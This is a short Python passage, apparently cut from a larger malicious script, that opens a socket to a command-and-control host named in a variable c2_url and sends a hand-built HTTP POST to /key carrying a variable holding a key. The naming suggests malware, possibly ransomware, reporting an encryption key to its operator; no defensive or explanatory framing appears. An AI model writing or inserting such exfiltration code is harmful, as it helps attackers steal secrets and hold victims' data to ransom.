        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((c2_url, 80))
            s.sendall(b'POST /key HTTP/1.1\r\nHost: ' + c2_url.encode() + b'\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + str(len(key)).encode() + b'\r\n\r\n' + key)
